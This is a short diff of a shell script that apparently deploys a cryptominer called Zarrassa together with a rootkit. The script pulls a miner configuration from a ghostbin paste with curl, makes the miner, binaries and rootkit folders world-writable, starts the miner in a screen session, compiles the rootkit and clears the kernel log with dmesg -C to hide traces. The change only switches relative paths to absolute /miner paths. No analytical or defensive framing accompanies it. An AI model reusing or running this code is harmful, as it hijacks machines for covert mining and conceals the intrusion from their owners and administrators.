@@ -7,11 +7,11 @@ cd Zarrassa
 rm config.json
 NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
 curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
-chmod 777 *
-chmod 777 ./binaries/*
-chmod 777 ./rootkit/*
-ls
-screen ./cpuminer.sh
+chmod 777 /miner/*
+chmod 777 /miner/Zarrassa/*
+chmod 777 /miner/Zarrassa/binaries/*
+chmod 777 /miner/Zarrassa/rootkit/*
+screen /miner/Zarrassa/cpuminer.sh
 cd rootkit
 make
 dmesg -C
